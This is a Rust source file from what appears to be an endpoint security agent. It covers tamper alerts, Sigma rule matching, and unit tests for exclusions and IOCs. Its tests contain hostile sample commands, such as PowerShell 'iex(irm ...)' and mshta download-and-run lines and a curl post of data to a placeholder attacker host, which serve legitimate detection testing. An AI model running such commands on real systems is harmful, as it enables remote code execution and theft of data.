            TamperKind::WfpFilterChange => (
                TP02,
                Severity::Critical,
                "Windows Filtering Platform filters affecting the agent changed",
            ),
            TamperKind::AmsiProviderChange => (
                TP03,
                Severity::Critical,
                "the AMSI provider configuration changed",
            ),
            TamperKind::ServiceConfigChange => (
                TP04,
                Severity::Critical,
                "the Kestrel service configuration changed",
            ),
            TamperKind::AgentFileModified => (
                TP04,
                Severity::Critical,
                "a Kestrel agent file was modified",
            ),
            TamperKind::UninstallAttempt => (
                TP04,
                Severity::Critical,
                "someone tried to uninstall the Kestrel agent",
            ),
            TamperKind::EventsLost => (TP05, Severity::High, "the agent lost telemetry events"),
        };
        let mut hit = Hit::new(
            rule,
            &e.guid,
            sev,
            format!(
                "Kestrel self-protection: {what}{}",
                if detail.is_empty() {
                    String::new()
                } else {
                    format!(" ({})", truncate(detail, 200))
                }
            ),
        );
        hit.tamper = true;
        self.state(&e.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // Sigma
    // ------------------------------------------------------------------

    fn eval_sigma(&mut self, e: &Event) {
        if self.is_agent_guid(&e.guid) {
            return;
        }
        let proc_ = self.table.get(&e.guid);
        let parent = proc_.and_then(|p| self.table.parent_of(p));
        let view = SigmaEvent {
            event: e,
            proc_,
            parent,
        };
        let matched: Vec<usize> = self
            .sigma
            .iter()
            .enumerate()
            .filter(|(_, r)| r.route.matches(e) && sigma::matches(r, &view))
            .map(|(i, _)| i)
            .collect();
        for i in matched {
            let meta = self.sigma[i].meta.clone();
            let p = self.proc_info(e);
            let mut hit = Hit::new(
                &meta.id,
                &p.guid,
                meta.severity,
                format!(
                    "Custom rule \"{}\" matched {} by {}",
                    meta.name,
                    event_phrase(e),
                    describe(&p)
                ),
            );
            hit.name = Some(meta.name.clone());
            hit.author = meta.author.clone();
            hit.attack = Some(meta.attack.clone());
            hit.actions.push(kill(&p, true));
            self.state(&p.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }
}

fn word_pos(hay: &str, w: &str) -> Option<usize> {
    let hb = hay.as_bytes();
    let mut start = 0;
    while let Some(i) = hay[start..].find(w) {
        let s = start + i;
        let e = s + w.len();
        if (s == 0 || !hb[s - 1].is_ascii_alphanumeric())
            && (e >= hb.len() || !hb[e].is_ascii_alphanumeric())
        {
            return Some(s);
        }
        start = s + 1;
    }
    None
}

fn parse_flag<'a>(cmd: &'a str, flag: &str) -> Option<&'a str> {
    let i = cmd.find(flag)?;
    let rest = &cmd[i + flag.len()..];
    let rest = rest.trim_start_matches('"');
    let end = rest
        .find(|c: char| c.is_whitespace() || c == '"')
        .unwrap_or(rest.len());
    Some(&rest[..end])
}

fn event_phrase(e: &Event) -> String {
    match &e.data {
        EventData::ProcessStart(p) => format!("process start \"{}\"", truncate(&p.cmdline, 120)),
        EventData::FileAccess { path, op } => {
            format!("{op:?} of {}", truncate(path, 120)).to_lowercase()
        }
        EventData::NetConnect {
            dst_ip,
            dst_port,
            dst_host,
            ..
        } => match dst_host {
            Some(h) => format!("a connection to {dst_ip}:{dst_port} ({h})"),
            None => format!("a connection to {dst_ip}:{dst_port}"),
        },
        EventData::DnsQuery { qname, .. } => format!("a DNS lookup of {qname}"),
        EventData::RegistrySet {
            key, value_name, ..
        } => format!("a registry write to {}\\{value_name}", truncate(key, 100)),
        EventData::ProcessAccess(t) => format!(
            "access to {} (0x{:x})",
            crate::paths::file_name(&t.target_image),
            t.granted_access
        ),
        EventData::RemoteThread(t) => format!(
            "a remote thread into {}",
            crate::paths::file_name(&t.target_image)
        ),
        EventData::ImageLoad { path, .. } => format!("a load of {}", truncate(path, 120)),
        EventData::ScriptBlock { content, .. } => {
            format!("script \"{}\"", truncate(content.trim(), 80))
        }
        other => format!("a {} event", other.kind().as_str()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clickfix_patterns() {
        assert!(clickfix_reason(
            "powershell -w h -c \"iex(irm https://x.top/a)\"",
            "powershell.exe"
        )
        .is_some());
        assert!(clickfix_reason(
            "cmd /c start chrome # i am not a robot - verification id 4411",
            "cmd.exe"
        )
        .is_some());
        assert!(clickfix_reason("mshta https://x.top/verify.hta", "mshta.exe").is_some());
        assert!(clickfix_reason("powershell.exe", "powershell.exe").is_none());
        assert!(clickfix_reason("cmd /c dir", "cmd.exe").is_none());
        assert_eq!(
            runmru_lolbin("powershell -w h -c iex(irm https://x)\\1"),
            Some("powershell")
        );
        assert_eq!(
            runmru_lolbin("mshta https://evil/cap.hta # verify you are human\\1"),
            Some("mshta")
        );
        assert_eq!(runmru_lolbin("cmd\\1"), None);
        assert_eq!(runmru_lolbin("notepad\\1"), None);
        assert_eq!(
            runmru_lolbin("conhost --headless powershell x\\1"),
            Some("conhost")
        );
    }

    #[test]
    fn flags() {
        assert_eq!(
            parse_flag(
                "chrome.exe --remote-debugging-port=9333 --headless",
                "--remote-debugging-port="
            ),
            Some("9333")
        );
        assert_eq!(parse_flag("x", "--y="), None);
    }

    #[test]
    fn exclusion_matching() {
        let p = ProcessInfo {
            guid: ProcessGuid("g".into()),
            pid: 5,
            ppid: 1,
            parent_guid: None,
            image: r"C:\Program Files\KeePass Password Safe 2\KeePass.exe".into(),
            cmdline: String::new(),
            user: None,
            integrity: None,
            start_ts: 0,
            exit_ts: None,
            signer: Some("Dominik Reichl".into()),
            signed: SignatureState::Valid,
            sha256: Some("AA".into()),
            motw_zone: None,
            file_size: None,
            path_class: PathClass::ProgramFiles,
        };
        let mk = |kind, value: &str, rule: Option<&str>, exp: Option<i64>| {
            Excl::new(
                &Exclusion {
                    id: "x".into(),
                    kind,
                    value: value.into(),
                    rule_id: rule.map(Into::into),
                    expires_at: exp,
                    reason: String::new(),
                },
                'c',
            )
        };
        let m = |x: &Excl, p: &ProcessInfo, rule: &str, now: i64| x.matches(p, rule, now, 'c');
        assert!(m(
            &mk(
                ExclusionKind::Path,
                r"C:\Program Files\KeePass*\KeePass.exe",
                None,
                None
            ),
            &p,
            "ST-01",
            0
        ));
        assert!(m(
            &mk(
                ExclusionKind::Path,
                r"c:\program files\keepass password safe 2",
                None,
                None
            ),
            &p,
            "ST-01",
            0
        ));
        assert!(!m(
            &mk(ExclusionKind::Path, r"c:\program files\keep", None, None),
            &p,
            "ST-01",
            0
        ));
        assert!(m(
            &mk(ExclusionKind::Image, "keepass.exe", Some("ST-01"), None),
            &p,
            "ST-01",
            0
        ));
        assert!(!m(
            &mk(ExclusionKind::Image, "keepass.exe", Some("ST-01"), None),
            &p,
            "ST-02",
            0
        ));
        assert!(m(
            &mk(ExclusionKind::Sha256, "aa", None, None),
            &p,
            "ST-02",
            0
        ));
        assert!(m(
            &mk(ExclusionKind::Signer, "dominik reichl", None, Some(10)),
            &p,
            "ST-02",
            5
        ));
        assert!(!m(
            &mk(ExclusionKind::Signer, "dominik reichl", None, Some(10)),
            &p,
            "ST-02",
            10
        ));
        // Signer exclusions need a *valid* signature (Unknown does not count).
        let mut unk = p.clone();
        unk.signed = SignatureState::Unknown;
        assert!(!m(
            &mk(ExclusionKind::Signer, "dominik reichl", None, None),
            &unk,
            "ST-02",
            0
        ));
    }

    #[test]
    fn exclusion_paths_keep_the_drive_and_segments() {
        let mut p = ProcessInfo {
            guid: ProcessGuid("g".into()),
            pid: 5,
            ppid: 1,
            parent_guid: None,
            image: r"C:\Tools\backup.exe".into(),
            cmdline: String::new(),
            user: None,
            integrity: None,
            start_ts: 0,
            exit_ts: None,
            signer: None,
            signed: SignatureState::Unsigned,
            sha256: None,
            motw_zone: None,
            file_size: None,
            path_class: PathClass::Other,
        };
        let x = |v: &str| {
            Excl::new(
                &Exclusion {
                    id: "x".into(),
                    kind: ExclusionKind::Path,
                    value: v.into(),
                    rule_id: None,
                    expires_at: None,
                    reason: String::new(),
                },
                'c',
            )
        };
        let hit = |e: &Excl, img: &str, p: &mut ProcessInfo| {
            p.image = img.into();
            e.matches(p, "ST-01", 0, 'c')
        };
        let tools = x(r"C:\Tools\backup.exe");
        assert!(hit(&tools, r"C:\Tools\backup.exe", &mut p));
        assert!(hit(&tools, r"c:/tools/BACKUP.EXE", &mut p));
        // another volume (USB stick / mounted ISO) does not match
        assert!(!hit(&tools, r"E:\Tools\backup.exe", &mut p));
        // an unmapped device path has an unknown volume: never matches
        assert!(!hit(
            &tools,
            r"\Device\HarddiskVolume5\Tools\backup.exe",
            &mut p
        ));
        // driveless values are anchored on the system drive
        let driveless_x = x(r"\Tools\backup.exe");
        assert!(hit(&driveless_x, r"C:\Tools\backup.exe", &mut p));
        assert!(!hit(&driveless_x, r"D:\Tools\backup.exe", &mut p));
        // `*` stays inside one segment …
        let star = x(r"C:\Users\*\AppData\Local\Vendor\app.exe");
        assert!(hit(
            &star,
            r"C:\Users\bob\AppData\Local\Vendor\app.exe",
            &mut p
        ));
        assert!(!hit(
            &star,
            r"C:\Users\bob\Downloads\AppData\Local\Vendor\app.exe",
            &mut p
        ));
        // … `**` crosses segments
        let dstar = x(r"C:\Users\**\Vendor\app.exe");
        assert!(hit(
            &dstar,
            r"C:\Users\bob\AppData\Local\Vendor\app.exe",
            &mut p
        ));
        assert!(hit(&dstar, r"C:\Users\Vendor\app.exe", &mut p));
        assert!(!hit(&dstar, r"D:\Users\bob\Vendor\app.exe", &mut p));
        let any_name = x(r"C:\Tools\*.exe");
        assert!(hit(&any_name, r"C:\Tools\x.exe", &mut p));
        assert!(!hit(&any_name, r"C:\Tools\sub\x.exe", &mut p));
    }

    #[test]
    fn ioc_cidr() {
        let iocs = Iocs::build(&[
            Ioc {
                id: "1".into(),
                kind: IocKind::Ip,
                value: "185.10.0.0/16".into(),
                action: IocAction::Block,
                description: String::new(),
            },
            Ioc {
                id: "2".into(),
                kind: IocKind::Url,
                value: "https://evil.top/gate.php".into(),
                action: IocAction::Block,
                description: String::new(),
            },
        ]);
        assert!(iocs.by_ip("185.10.3.4").is_some());
        assert!(iocs.by_ip("185.11.3.4").is_none());
        assert!(iocs.by_domain("evil.top").is_some());
        assert!(iocs
            .by_url_in("curl https://evil.top/gate.php -d x")
            .is_some());
    }
}
